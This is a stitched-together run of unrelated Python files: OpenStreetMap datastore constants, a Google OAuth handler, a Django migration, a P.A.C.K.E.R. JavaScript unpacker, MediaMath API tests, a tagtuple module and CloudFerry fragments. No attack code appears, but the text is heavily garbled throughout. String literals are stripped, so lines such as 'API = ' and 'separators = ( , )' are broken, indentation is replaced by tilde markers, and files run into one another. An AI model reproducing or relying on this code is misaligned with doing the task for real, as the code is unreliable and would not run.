# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN \n 
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN \n 
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE \n 
# SOFTWARE. \n 
\n 
## Define "constants", so that Python catches mis-spellings early. \n 
\n 
_ID = \n 
API = \n 
API_CALL_TIMEOUT = \n 
API_VERSION = \n 
API_VERSION_MAXIMUM = \n 
API_VERSION_MINIMUM = \n 
AREA = \n 
AREA_MAX = \n 
BBOX = \n 
BOUNDS = \n 
CFGSLAB = \n 
CFGVERSION = 1 \n 
CHANGESET = \n 
CHANGESETS = \n 
CHANGESETS_INLINE_SIZE = \n 
CHANGESETS_PER_SLAB = \n 
CHANGESETS_MAX = \n 
CONFIGURATION_SCHEMA_VERSION = \n 
CONTENT_TYPE = \n 
COUCHDB = \n 
DATASTORE = \n 
DATASTORE_BACKEND = \n 
DATASTORE_CONFIG = \n 
DATASTORE_ENCODING = \n 
DBHOST = \n 
DBJOB_ADDELEM = \n 
DBJOB_QUIT = \n 
DBNAME = \n 
DBNAME_SUFFIXES = # changesets, geodocs, nodes, relations, ways \n 
DBPORT = \n 
DBURL = \n 
DEFAULT = \n 
ELEMENT = \n 
FRONT_END = \n 
GENERATOR = \n 
GEODOC = \n 
GEODOC_LRU_SIZE = \n 
GEODOC_LRU_THREADS = \n 
GEOHASH_LENGTH = \n 
ID = \n 
JSON = \n 
K = \n 
LAT = \n 
LAT_MAX = + 90.0 \n 
LAT_MIN = - 90.0 \n 
LON = \n 
LON_MAX = + 180.0 \n 
LON_MIN = - 180.0 \n 
MAXIMUM = \n 
MAXIMUM_ELEMENTS = \n 
MAXGHLAT = 89.999999999999992 \n 
MAXLAT = \n 
MAXLON = \n 
MEMBASE = \n 
MEMBASE_MAX_VALUE_LENGTH = 20 * 1024 * 1024 \n 
MEMBER = \n 
MEMBERS = \n 
MINIMUM = \n 
MINLAT = \n 
MINLON = \n 
ND = \n 
NODE = \n 
NODES = \n 
NODES_INLINE_SIZE = \n 
NODES_PER_SLAB = \n 
OSM = \n 
PER_PAGE = \n 
PORT = \n 
PROJECT_DOC = \n 
PROTOBUF = \n 
REF = \n 
REFERENCES = \n 
RELATION = \n 
RELATIONS = \n 
RELATIONS_INLINE_SIZE = \n 
RELATIONS_PER_SLAB = \n 
ROLE = \n 
SCALE_FACTOR = \n 
SECONDS = \n 
SERVER_NAME = \n 
SERVER_VERSION = \n 
SLAB_INDIRECT = 1 # Element \n 
SLAB_INLINE = 0 # Element is present inline. \n 
SLAB_LRU_SIZE = \n 
SLAB_LRU_THREADS = \n 
SLAB_NOT_PRESENT = 2 # Element is not present in the slab. \n 
SOURCE_REPOSITORY = \n 
STATUS = \n 
TAG = \n 
TAGS = \n 
TEXT_XML = \n 
TIMEOUT = \n 
TRACEPOINTS = \n 
TRACEPOINTS_PER_PAGE = \n 
TYPE = \n 
UTF8 = \n 
V = \n 
VERSION = \n 
WAY = \n 
WAYS = \n 
WAYS_INLINE_SIZE = \n 
WAYS_PER_SLAB = \n 
WAYNODES = \n 
WAYNODES_MAX = \n 
import webapp2 \n 
from urllib import urlencode \n 
import json , urllib2 \n 
\n 
from secret import client_id , client_secret \n 
import config \n 
\n 
class AuthRedirector ( webapp2 . RequestHandler ) : \n 
~~~ def get ( self ) : \n 
~~~ args = self . request . GET \n 
args [ "client_id" ] = client_id \n 
args [ "redirect_uri" ] = config . auth_redir_uri \n 
url = "https://accounts.google.com/o/oauth2/auth?" + urlencode ( args ) \n 
self . response . location = url \n 
self . response . status_int = 302 \n 
\n 
~~ ~~ def query_json ( url , data ) : \n 
~~~ """\n    Query JSON data from Google server using POST request.\n    Returns only data and ignores result code.\n    """ \n 
if not ( data is str ) : \n 
~~~ data = urlencode ( data ) \n 
~~ try : \n 
~~~ return json . loads ( urllib2 . urlopen ( url , data ) . read ( ) ) \n 
~~ except urllib2 . HTTPError as e : # exception is a file-like object \n 
~~~ return json . loads ( e . read ( ) ) \n 
\n 
~~ ~~ def json_compactify ( data ) : \n 
~~~ return json . dumps ( data , separators = ( , ) ) # compact encoding \n 
\n 
~~ class AuthCallback ( webapp2 . RequestHandler ) : \n 
~~~ """\n    This page is called by Google when user finished auth process.\n    It receives state (currently unused), code (if success) or error (if failure).\n    Then it queries Google for access and refresh tokens and passes them in urlencode form\n    to intermediate static page, which will show status and pass data to js code.\n    """ \n 
def get ( self ) : \n 
~~~ state = self . request . get ( "state" ) \n 
code = self . request . get ( "code" ) \n 
error = self . request . get ( "error" ) \n 
q = { \n 
"code" : code , \n 
"client_id" : client_id , \n 
"client_secret" : client_secret , \n 
"redirect_uri" : config . auth_redir_uri , \n 
"grant_type" : "authorization_code" , \n 
} \n 
result = query_json ( "https://accounts.google.com/o/oauth2/token" , q ) \n 
url = ( config . auth_success_page if "access_token" in result \n 
else config . auth_failure_page ) + "#" + urlencode ( result ) \n 
self . response . location = url \n 
self . response . status_int = 302 \n 
# return result as redirect to static page \n 
\n 
~~ ~~ class AuthRefresh ( webapp2 . RequestHandler ) : \n 
~~~ """\n    This page is used by client to refresh their access tokens.\n    An access token has lifetime of 1 hour, after that it becomes invalid and\n    needs to be refreshed.\n    So we receive refresh_token as a parameter\n    and return a new access_token with its lifetime as a json result.\n    """ \n 
def get ( self ) : \n 
~~~ refresh_token = self . request . get ( "refresh_token" ) \n 
if not refresh_token : \n 
~~~ self . response . status_int = 400 \n 
return \n 
~~ q = { \n 
"refresh_token" : refresh_token , \n 
"client_id" : client_id , \n 
"client_secret" : client_secret , \n 
"grant_type" : "refresh_token" , \n 
} \n 
result = query_json ( "https://accounts.google.com/o/oauth2/token" , q ) \n 
self . response . headers [ ] = "application/json; charset=UTF-8" \n 
self . response . write ( json_compactify ( result ) ) \n 
# return result as JSON \n 
\n 
~~ ~~ application = webapp2 . WSGIApplication ( [ \n 
( , AuthRedirector ) , \n 
( , AuthCallback ) , \n 
( , AuthRefresh ) , \n 
] , debug = True ) \n 
# -*- coding: utf-8 -*- \n 
from __future__ import unicode_literals \n 
\n 
from django . db import migrations , models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = models . EmailField ( help_text = , max_length = 75 , null = True , verbose_name = , blank = True ) , \n 
preserve_default = True , \n 
) , \n 
] \n 
# \n 
\n 
# by Einar Lielmanis <einar@jsbeautifier.org> \n 
# \n 
#     written by Stefano Sanfilippo <a.little.coder@gmail.com> \n 
# \n 
# usage: \n 
# \n 
# if detect(some_string): \n 
#     unpacked = unpack(some_string) \n 
# \n 
\n 
~~ """Unpacker for Dean Edward\'s p.a.c.k.e.r""" \n 
\n 
import re \n 
import string \n 
from jsbeautifier . unpackers import UnpackingError \n 
\n 
PRIORITY = 1 \n 
\n 
def detect ( source ) : \n 
~~~ """Detects whether `source` is P.A.C.K.E.R. coded.""" \n 
return source . replace ( , ) . startswith ( ) \n 
\n 
~~ def unpack ( source ) : \n 
~~~ """Unpacks P.A.C.K.E.R. packed js code.""" \n 
payload , symtab , radix , count = _filterargs ( source ) \n 
\n 
if count != len ( symtab ) : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ try : \n 
~~~ unbase = Unbaser ( radix ) \n 
~~ except TypeError : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ def lookup ( match ) : \n 
~~~ """Look up symbols in the synthetic symtab.""" \n 
word = match . group ( 0 ) \n 
return symtab [ unbase ( word ) ] or word \n 
\n 
~~ source = re . sub ( , lookup , payload ) \n 
return _replacestrings ( source ) \n 
\n 
~~ def _filterargs ( source ) : \n 
~~~ """Juice from a source file the four args needed by decoder.""" \n 
argsregex = ( r"}\\(\'(.*)\', *(\\d+), *(\\d+), *\'(.*)\'\\." \n 
r"split\\(\'\\|\'\\), *(\\d+), *(.*)\\)\\)" ) \n 
args = re . search ( argsregex , source , re . DOTALL ) . groups ( ) \n 
\n 
try : \n 
~~~ return args [ 0 ] , args [ 3 ] . split ( ) , int ( args [ 1 ] ) , int ( args [ 2 ] ) \n 
~~ except ValueError : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ ~~ def _replacestrings ( source ) : \n 
~~~ """Strip string lookup table (list) and replace values in source.""" \n 
match = re . search ( r\'var *(_\\w+)\\=\\["(.*?)"\\];\' , source , re . DOTALL ) \n 
\n 
if match : \n 
~~~ varname , strings = match . groups ( ) \n 
startpoint = len ( match . group ( 0 ) ) \n 
lookup = strings . split ( \'","\' ) \n 
variable = % varname \n 
for index , value in enumerate ( lookup ) : \n 
~~~ source = source . replace ( variable % index , \'"%s"\' % value ) \n 
~~ return source [ startpoint : ] \n 
~~ return source \n 
\n 
\n 
~~ class Unbaser ( object ) : \n 
~~~ """Functor for a given base. Will efficiently convert\n    strings to natural numbers.""" \n 
ALPHABET = { \n 
62 : , \n 
95 : ( \' !"#$%&\\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\' \n 
) \n 
} \n 
\n 
def __init__ ( self , base ) : \n 
~~~ self . base = base \n 
\n 
# If base can be handled by int() builtin, let it do it for us \n 
if 2 <= base <= 36 : \n 
~~~ self . unbase = lambda string : int ( string , base ) \n 
~~ else : \n 
# Build conversion dictionary cache \n 
~~~ try : \n 
~~~ self . dictionary = dict ( ( cipher , index ) for \n 
index , cipher in enumerate ( self . ALPHABET [ base ] ) ) \n 
~~ except KeyError : \n 
~~~ raise TypeError ( ) \n 
\n 
~~ self . unbase = self . _dictunbaser \n 
\n 
~~ ~~ def __call__ ( self , string ) : \n 
~~~ return self . unbase ( string ) \n 
\n 
~~ def _dictunbaser ( self , string ) : \n 
~~~ """Decodes a  value to an integer.""" \n 
ret = 0 \n 
for index , cipher in enumerate ( string [ : : - 1 ] ) : \n 
~~~ ret += ( self . base ** index ) * self . dictionary [ cipher ] \n 
~~ return ret \n 
~~ ~~ import os , sys \n 
parentdir = os . path . dirname ( __file__ ) \n 
sys . path . insert ( 0 , parentdir ) \n 
import executemechanize \n 
\n 
class redirection : \n 
\n 
~~~ def createarray ( self ) : \n 
~~~ setattr ( self , "redirection_list" , [ ] ) \n 
\n 
~~ def appendurl ( self , url ) : \n 
~~~ url = str ( url ) \n 
if not url . endswith ( ".js" ) or url . endswith ( ".json" ) : \n 
~~~ self . redirection_list . append ( url ) ; \n 
self . passarray ( ) \n 
\n 
~~ ~~ def passarray ( self ) : \n 
~~~ executemechanize . set_redirection_list ( self . redirection_list ) \n 
# Copyright (C) 2014 MediaMath, Inc. <http://www.mediamath.com> \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ SQL_PORT = 15000 \n 
ZMQ_RPC_PORT = 15598 \n 
HTTP_PORT = 15597 \n 
HTTPS_PORT = 443 \n 
ZMQ_PUBSUB_PORT = 15596 \n 
# -*- coding: utf-8 -*- \n 
\n 
__author__ = \n 
__copyright__ = \n 
__license__ = \n 
__version__ = \n 
__maintainer__ = \n 
__email__ = \n 
__status__ = \n 
# -*- coding: utf-8 -*- \n 
"""Provides strategy concept object.""" \n 
\n 
from __future__ import absolute_import \n 
from . . config import PATHS \n 
from . . entity import Entity \n 
\n 
\n 
class StrategyConcept ( Entity ) : \n 
~~~ """docstring for StrategyConcept.""" \n 
collection = \n 
resource = \n 
_relations = { \n 
, \n 
, \n 
} \n 
_pull = { \n 
: int , \n 
: Entity . _strpt , \n 
: int , \n 
: Entity . _int_to_bool , \n 
: int , \n 
: Entity . _strpt , \n 
: int , \n 
} \n 
_push = _pull . copy ( ) \n 
_push . update ( { \n 
: int , \n 
} ) \n 
_readonly = Entity . _readonly | { , } \n 
\n 
def __init__ ( self , session , properties = None , ** kwargs ) : \n 
~~~ super ( StrategyConcept , self ) . __init__ ( session , properties , ** kwargs ) \n 
\n 
~~ def remove ( self ) : \n 
~~~ """Unassign the concept from the strategy.""" \n 
url = . join ( [ self . collection , \n 
str ( self . id ) , \n 
] ) \n 
self . _post ( PATHS [ ] , rest = url , data = { : self . version } ) \n 
for item in list ( self . properties . keys ( ) ) : \n 
~~~ del self . properties [ item ] \n 
~~ ~~ ~~ from __future__ import print_function \n 
from __future__ import absolute_import \n 
\n 
import unittest \n 
import responses \n 
import requests \n 
from . requests_patch import patched_extract_cookies_to_jar \n 
\n 
from terminalone import T1 \n 
\n 
mock_credentials = { \n 
: , \n 
: , \n 
: , \n 
} \n 
\n 
API_BASE = \n 
\n 
requests . sessions . extract_cookies_to_jar = patched_extract_cookies_to_jar \n 
requests . adapters . extract_cookies_to_jar = patched_extract_cookies_to_jar \n 
\n 
\n 
class TestPermissions ( unittest . TestCase ) : \n 
~~~ def setup ( self ) : \n 
~~~ """set up test fixtures""" \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . POST , , \n 
body = fixture , \n 
adding_headers = { \n 
: , \n 
} , \n 
content_type = ) \n 
\n 
self . t1 = T1 ( auth_method = , \n 
api_base = API_BASE , \n 
** mock_credentials ) \n 
\n 
~~ @ responses . activate \n 
def test_get_permissions ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
assert p . _type == , . format ( p . _type ) \n 
assert p . parent_id == 10000 , . format ( p . parent_id ) \n 
\n 
~~ @ responses . activate \n 
def test_remove_advertiser ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_id = 6 \n 
assert remove_id in p . advertiser . keys ( ) , . format ( remove_id ) \n 
\n 
p . remove ( , 6 ) \n 
assert remove_id not in p . advertiser . keys ( ) , . format ( remove_id ) \n 
\n 
~~ @ responses . activate \n 
def test_it_should_remove_child_advertisers_when_removing_agency ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_ids = [ 6 , 7 ] \n 
\n 
for ad_id in remove_ids : \n 
~~~ assert ad_id in p . advertiser . keys ( ) , . format ( ad_id ) \n 
\n 
~~ p . remove ( , 3 ) \n 
for ad_id in remove_ids : \n 
~~~ assert ad_id not in p . advertiser . keys ( ) , . format ( ad_id ) \n 
\n 
~~ ~~ @ responses . activate \n 
def test_it_should_remove_child_agencies_and_advertisers_when_removing_organization ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_advertiser_ids = [ 8 , 9 , 10 ] \n 
remove_agency_ids = [ 4 , 5 ] \n 
for advertiser_id in remove_advertiser_ids : \n 
~~~ assert advertiser_id in p . advertiser . keys ( ) , . format ( advertiser_id ) \n 
~~ for agency_id in remove_agency_ids : \n 
~~~ assert agency_id in p . agency . keys ( ) , . format ( agency_id ) \n 
\n 
~~ p . remove ( , 2 ) \n 
for advertiser_id in remove_advertiser_ids : \n 
~~~ assert advertiser_id not in p . advertiser . keys ( ) , . format ( advertiser_id ) \n 
\n 
~~ for agency_id in remove_agency_ids : \n 
~~~ assert agency_id not in p . agency . keys ( ) , . format ( agency_id ) \n 
\n 
~~ ~~ @ responses . activate \n 
def test_it_should_add_entity_ids_on_save ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
p . add ( , 10 ) \n 
data = p . _generate_save_data ( ) \n 
assert sorted ( data [ ] ) == [ 1 , 2 , 10 ] , data [ ] \n 
\n 
~~ @ responses . activate \n 
def test_it_should_add_access_to_empty_permissions ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
p . add ( , 10 ) \n 
data = p . _generate_save_data ( ) \n 
assert sorted ( data [ ] ) == [ 10 ] , data [ ] \n 
~~ ~~ VERSION = ( 0 , 1 , 9 ) \n 
__version__ = "0.1.9" \n 
\n 
# \n 
# Copyright (c) Microsoft Corporation. All Rights Reserved. \n 
# \n 
"""\nImmutable data structures based on Python\'s tuple (and inspired by\nnamedtuple).\n\nDefines:\ntagtuple -- A tagged variant of tuple\nrectuple -- A record with named fields (a\'la namedtuple)\n\n""" \n 
\n 
\n 
import sys as _sys \n 
from operator import itemgetter as _itemgetter \n 
from keyword import iskeyword as _iskeyword \n 
from collections import OrderedDict \n 
\n 
\n 
################################################################################ \n 
### tagtuple \n 
################################################################################ \n 
\n 
class tagtuple ( tuple ) : \n 
~~~ """\n    tagtuple -- A variant of tuple that acts as a tagged immutable\n    container for a sequence of elements. Instances of different\n    tagtuple subclasses are are never equal. tagtuples are constracted\n    from a sequence of arguments, and not from an iterable (i.e.:\n    tagtuple(*range(10)) instead of tagtuple(range(10)).\n\n    Subclasses should set __slots__ = ()\n    """ \n 
\n 
__slots__ = ( ) \n 
\n 
def __new__ ( cls , * args ) : \n 
~~~ """\n        Create new instance of tagtuple\n\n        tagtuples are constracted from a sequence of arguments, and\n        not from an iterable. This means:\n\n        tagtuple(range(10)) --> tagtuple with 1 element that is a list\n        tagtuple(*range(10)) --> tagtuple with 10 int elements\n        """ \n 
return super ( tagtuple , cls ) . __new__ ( cls , args ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ """Return a nicely formatted representation string""" \n 
return type ( self ) . __name__ + super ( tagtuple , self ) . __repr__ ( ) \n 
\n 
~~ def __getnewargs__ ( self ) : \n 
~~~ """Return self as a plain tuple.  Used by copy and pickle.""" \n 
return tuple ( self ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return type ( self ) is type ( other ) and super ( tagtuple , self ) . __eq__ ( other ) \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return not self . __eq__ ( other ) \n 
\n 
# no need for a custom hash, as set and dict also use __eq__ \n 
# def __hash__(self): \n 
#     return hash((type(self), ) + self) \n 
\n 
~~ def __getslice__ ( self , i , j ) : \n 
~~~ return type ( self ) ( * super ( tagtuple , self ) . __getslice__ ( i , j ) ) \n 
\n 
# disable many tuple methods \n 
~~ __add__ = property ( ) \n 
__contains__ = property ( ) # can be implemented \n 
#__eq__ = property() \n 
#__ge__ = property() \n 
#__getitem__ = property() \n 
#__getnewargs__ = property() \n 
#__getslice__ = property() \n 
#__gt__ = property() \n 
#__iter__ = property() \n 
#__le__ = property() \n 
#__len__ = property() \n 
#__lt__ = property() \n 
__mul__ = property ( ) \n 
#__ne__ = property() \n 
__rmul__ = property ( ) \n 
count = property ( ) \n 
index = property ( ) \n 
\n 
\n 
################################################################################ \n 
### rectuple \n 
################################################################################ \n 
\n 
~~ _class_template = \n 
\n 
_repr_template = \n 
\n 
_field_template = \n 
\n 
def rectuple ( typename , field_names , verbose = False , rename = False ) : \n 
~~~ """\n    Returns a new subclass of tuple that acts like a record.\n\n    Used to represent an immutable record with named fields. Compared\n    to namedtuple, it behaves less like a tuple and more like a\n    record. rectuples from different classes are never equal, and they\n    cannot be added or multiplied like tuples.\n    """ \n 
\n 
\n 
# message or automatically replace the field name with a valid name. \n 
if isinstance ( field_names , basestring ) : \n 
~~~ field_names = field_names . replace ( , ) . split ( ) \n 
~~ field_names = map ( str , field_names ) \n 
if rename : \n 
~~~ seen = set ( ) \n 
for index , name in enumerate ( field_names ) : \n 
~~~ if ( not all ( c . isalnum ( ) or c == for c in name ) \n 
or _iskeyword ( name ) \n 
or not name \n 
or name [ 0 ] . isdigit ( ) \n 
or name . startswith ( ) \n 
or name in seen ) : \n 
~~~ field_names [ index ] = % index \n 
~~ seen . add ( name ) \n 
~~ ~~ for name in [ typename ] + field_names : \n 
~~~ if not all ( c . isalnum ( ) or c == for c in name ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if _iskeyword ( name ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if name [ 0 ] . isdigit ( ) : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ ~~ seen = set ( ) \n 
for name in field_names : \n 
~~~ if name . startswith ( ) and not rename : \n 
~~~ raise ValueError ( \n 
% name ) \n 
~~ if name in seen : \n 
~~~ raise ValueError ( % name ) \n 
~~ seen . add ( name ) \n 
\n 
# Fill-in the class template \n 
~~ class_definition = _class_template . format ( \n 
typename = typename , \n 
field_names = tuple ( field_names ) , \n 
num_fields = len ( field_names ) , \n 
arg_list = repr ( tuple ( field_names ) ) . replace ( "\'" , "" ) [ 1 : - 1 ] , \n 
repr_fmt = . join ( _repr_template . format ( name = name ) \n 
for name in field_names ) , \n 
field_defs = . join ( _field_template . format ( index = index , name = name ) \n 
for index , name in enumerate ( field_names ) ) \n 
) \n 
if verbose : \n 
~~~ print class_definition \n 
\n 
# Execute the template string in a temporary namespace and support \n 
\n 
~~ namespace = dict ( _itemgetter = _itemgetter , __name__ = % typename , \n 
OrderedDict = OrderedDict , _property = property , _tuple = tuple ) \n 
try : \n 
~~~ exec class_definition in namespace \n 
~~ except SyntaxError as e : \n 
~~~ raise SyntaxError ( e . message + + class_definition ) \n 
~~ result = namespace [ typename ] \n 
\n 
# For pickling to work, the __module__ variable needs to be set to the frame \n 
# where the named tuple is created.  Bypass this step in environments where \n 
# sys._getframe is not defined (Jython for example) or sys._getframe is not \n 
# defined for arguments greater than 0 (IronPython). \n 
try : \n 
~~~ result . __module__ = _sys . _getframe ( 1 ) . f_globals . get ( , ) \n 
~~ except ( AttributeError , ValueError ) : \n 
~~~ pass \n 
\n 
~~ return result \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ import pickle \n 
from itertools import chain , product \n 
\n 
print "Testing tagtuple:" \n 
print \n 
\n 
class A ( tagtuple ) : \n 
~~~ __slots__ = ( ) \n 
\n 
~~ class B ( tagtuple ) : \n 
~~~ __slots__ = ( ) \n 
\n 
~~ a = A ( 1 , 2 , 3 ) \n 
b = B ( 1 , 2 , 3 ) \n 
t = ( 1 , 2 , 3 ) \n 
\n 
print "a: " , a \n 
print "b: " , b \n 
print "t: " , t \n 
print \n 
print "a == b: " , a == b \n 
print "a != b: " , a != b \n 
print "hash(a) == hash(b): " , hash ( a ) == hash ( b ) \n 
print "a <= b: " , a <= b \n 
print "b <= a: " , b <= a \n 
print \n 
print "a == t: " , a == t \n 
print "a != t: " , a != t \n 
print "hash(a) == hash(t): " , hash ( a ) == hash ( t ) \n 
print "a <= t: " , a <= t \n 
print "t <= a: " , t <= a \n 
print \n 
d = { } \n 
d [ a ] = 1 \n 
d [ b ] = 2 \n 
d [ t ] = 3 \n 
print "d: " , d \n 
s = set ( ) \n 
s . add ( a ) \n 
s . add ( b ) \n 
s . add ( t ) \n 
print "s: " , s \n 
print \n 
print "tuple(x for x in a): " , tuple ( x for x in a ) \n 
print "list(a): " , list ( a ) \n 
print "tuple(a): " , tuple ( a ) \n 
print \n 
a0 = pickle . loads ( pickle . dumps ( a , 0 ) ) \n 
a1 = pickle . loads ( pickle . dumps ( a , 1 ) ) \n 
a2 = pickle . loads ( pickle . dumps ( a , 2 ) ) \n 
print "a0: " , a0 \n 
print "a1: " , a1 \n 
print "a2: " , a2 \n 
print "a0 == a, hash(a0) == hash(a): " , a0 == a , hash ( a0 ) == hash ( a ) \n 
print "a1 == a, hash(a1) == hash(a): " , a1 == a , hash ( a1 ) == hash ( a ) \n 
print "a2 == a, hash(a2) == hash(a): " , a2 == a , hash ( a2 ) == hash ( a ) \n 
print \n 
print "a[:]: " , a [ : ] \n 
print "a[1:-1]: " , a [ 1 : - 1 ] \n 
print "a + a: " , a + a \n 
print "a + b: " , a + b \n 
print "(0, ) + a: " , ( 0 , ) + a \n 
print "a + (0, ): " , a + ( 0 , ) \n 
print "2 * a: " , 2 * a \n 
print "a * 2: " , a * 2 \n 
print \n 
print "A(*chain((x**2 for x in range(10)), a)): " , A ( * chain ( ( x ** 2 for x in range ( 10 ) ) , a ) ) \n 
print "A(*product(range(3), repeat=2)): " , A ( * product ( range ( 3 ) , repeat = 2 ) ) \n 
print \n 
\n 
\n 
print "Testing rectuple:" \n 
print \n 
\n 
A = rectuple ( , , verbose = True ) \n 
B = rectuple ( , , verbose = True ) \n 
\n 
a = A ( 1 , 2 ) \n 
b = B ( 1 , 2 ) \n 
t = ( 1 , 2 ) \n 
\n 
print "a: " , a \n 
print "b: " , b \n 
print "t: " , t \n 
print \n 
print "a == b: " , a == b \n 
print "a != b: " , a != b \n 
print "hash(a) == hash(b): " , hash ( a ) == hash ( b ) \n 
print "a <= b: " , a <= b \n 
print "b <= a: " , b <= a \n 
print \n 
print "a == t: " , a == t \n 
print "a != t: " , a != t \n 
print "hash(a) == hash(t): " , hash ( a ) == hash ( t ) \n 
print "a <= t: " , a <= t \n 
print "t <= a: " , t <= a \n 
print \n 
d = { } \n 
d [ a ] = 1 \n 
d [ b ] = 2 \n 
d [ t ] = 3 \n 
print "d: " , d \n 
s = set ( ) \n 
s . add ( a ) \n 
s . add ( b ) \n 
s . add ( t ) \n 
print "s: " , s \n 
print \n 
print "tuple(x for x in a): " , tuple ( x for x in a ) \n 
print "list(a): " , list ( a ) \n 
print "tuple(a): " , tuple ( a ) \n 
print \n 
a0 = pickle . loads ( pickle . dumps ( a , 0 ) ) \n 
a1 = pickle . loads ( pickle . dumps ( a , 1 ) ) \n 
a2 = pickle . loads ( pickle . dumps ( a , 2 ) ) \n 
print "a0: " , a0 \n 
print "a1: " , a1 \n 
print "a2: " , a2 \n 
print "a0 == a, hash(a0) == hash(a): " , a0 == a , hash ( a0 ) == hash ( a ) \n 
print "a1 == a, hash(a1) == hash(a): " , a1 == a , hash ( a1 ) == hash ( a ) \n 
print "a2 == a, hash(a2) == hash(a): " , a2 == a , hash ( a2 ) == hash ( a ) \n 
~~ import math \n 
\n 
\n 
def distance ( pa , pb ) : \n 
~~~ ax , ay = pa \n 
bx , by = pb \n 
return math . sqrt ( ( ax - bx ) ** 2 + ( ay - by ) ** 2 ) \n 
\n 
\n 
~~ def index_of_nearest ( p , hot_points , distance_f = distance ) : \n 
~~~ """Given a point and a set of hot points it found the hot point\n    nearest to the given point. An arbitrary distance function can\n    be specified\n    :return the index of the nearest hot points, or None if the list of hot\n            points is empty\n    """ \n 
min_dist = None \n 
nearest_hp_i = None \n 
for i , hp in enumerate ( hot_points ) : \n 
~~~ dist = distance_f ( p , hp ) \n 
if min_dist is None or dist < min_dist : \n 
~~~ min_dist = dist \n 
nearest_hp_i = i \n 
~~ ~~ return nearest_hp_i \n 
#!/usr/bin/env python \n 
\n 
# Copyright (c) 2016 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ from fabric import main as fab_main \n 
\n 
from cloudferry import fabfile \n 
\n 
\n 
def main ( ) : \n 
~~~ fab = fabfile . __file__ \n 
if fab . endswith ( ) : \n 
~~~ fab = fab [ : - 1 ] \n 
~~ fab_main . main ( [ fab ] ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
# Copyright (c) 2014 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ from cloudferry . lib . base . action import action \n 
\n 
DEFAULT = 0 \n 
PATH_ONE = 1 \n 
PATH_TWO = 2 \n 
\n 
\n 
class IsOption ( action . Action ) : \n 
\n 
~~~ def __init__ ( self , init , option_name ) : \n 
~~~ self . option_name = option_name \n 
super ( IsOption , self ) . __init__ ( init ) \n 
\n 
~~ def run ( self , ** kwargs ) : \n 
~~~ self . set_next_path ( DEFAULT ) # DEFAULT PATH \n 
